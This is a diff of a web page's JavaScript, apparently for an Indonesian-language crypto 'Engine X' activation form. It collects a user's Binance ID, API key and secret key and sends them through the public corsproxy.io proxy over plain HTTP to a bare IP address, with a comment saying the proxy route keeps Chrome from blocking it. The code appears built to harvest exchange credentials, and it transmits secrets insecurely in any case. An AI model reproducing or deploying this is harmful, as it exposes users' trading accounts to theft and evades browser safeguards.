@@ -757,37 +757,32 @@ function toggleExtra(btn, id) {
     // FUNGSI UTAMA: AKTIFKAN ENGINE X
     async function aktifkanEngineX(event) {
         if (event) event.preventDefault(); // <--- BIAR GAK BALIK KE AWAL/REFRESH
-        
-        const btn = document.getElementById('tombol_aktivasi');
-        
+        const btn = document.getElementById('tombol_aktivasi');   
         // 1. Ambil data input
         const id_bin = document.getElementById('id_binance').value;
         const api = document.getElementById('api_key').value;
         const sec = document.getElementById('secret_key').value;
-
         // 2. Validasi awal
         if (!id_bin || !api || !sec) {
             alert("⚠️ LENGKAPI DATA DULU, JENDERAL!");
             return;
         }
-
         try {
             btn.innerText = "⏳ PROSES...";
             btn.style.background = "#ffa500"; // Kuning orange saat proses
 
-            // --- JALUR TIKUS (PROXY) SUPAYA TIDAK DIBLOKIR CHROME ---
-            const proxy = 'https://139.180.144.153/?';
-            const vultr_url = 'https://139.180.144.153/daftar';
-            // Ganti baris target yang lama dengan ini:
-            const target = 'https://corsproxy.io/?' + encodeURIComponent('http://139.180.144.153/daftar');
+            /// --- JALUR TIKUS (PROXY) SUPAYA TIDAK DIBLOKIR CHROME ---
+            const vultr_url = 'http://139.180.144.153/daftar'; 
+            const proxy = 'https://corsproxy.io/?';
+            const target = proxy + encodeURIComponent(vultr_url);
+            // -------------------------------------------------------
+            
             const response = await fetch(target, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ uid: id_bin, api: api, secret: sec })
+                body: JSON.stringify({ binance_id: id_bin, api_key: api, secret_key: sec })
             });
-
             const hasil = await response.json();
-            
             if (response.ok) {
                 // EFEK SUKSES
                 btn.innerText = "✅ ENGINE X AKTIF!";
